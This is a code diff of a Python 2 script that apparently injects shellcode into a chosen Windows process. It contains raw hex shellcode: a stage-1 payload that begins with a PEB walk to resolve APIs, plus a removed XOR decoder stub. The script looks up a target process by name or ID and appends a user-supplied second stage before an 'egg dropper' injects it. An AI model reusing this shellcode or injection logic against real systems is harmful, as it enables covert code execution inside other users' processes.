@@ -1,3 +1,6 @@
+'''
+(c) dohmatob elvis dopgima
+'''
 import sys
 from hashman import *
 from egg_dropper import drop_egg
@@ -5,11 +8,6 @@ from libdebug.debug import GetProcessIdFromName
 import struct
 import re
 from optparse import OptionParser
-
-xor_decoder = "\
-\xEB\x1A\x5E\xAD\x35\x96\x96\x96\x96\x89\xC1\x89\xC2\x89\xF7\xE3\
-\x07\x49\xAC\x34\x96\xAA\xEB\xF7\x29\xD6\xFF\xE6\xE8\xE1\xFF\xFF\
-\xFF"
 
 stage1_shellcode = "\
 \x64\x8B\x15\x30\x00\x00\x00\x8B\x52\x0C\x8B\x52\x14\x8B\x12\x8B\
@@ -58,19 +56,7 @@ if __name__ == '__main__':
     if target_PID is None:
         print "%s is neither a process imagename nor ID"%args[0]
         sys.exit(-1)
-       
-    #stage1_shellcode = open('kirikou.bin', 'rb').read()
-    #dump = 'stage1_shellcode = \"'
-    #count = 0
-    #for byte in stage1_shellcode:
-    #    if count % 16 == 0:
-    #        dump += '\\\n'
-    #    count += 1
-    #    dump += "\\x%02X"%ord(byte)
-    #dump += '\"'
-    #print dump
-    #sys.exit()
-    
+           
     shellcode = stage1_shellcode
     shellcode += args[1]
     shellcode += '\x00' # NULL
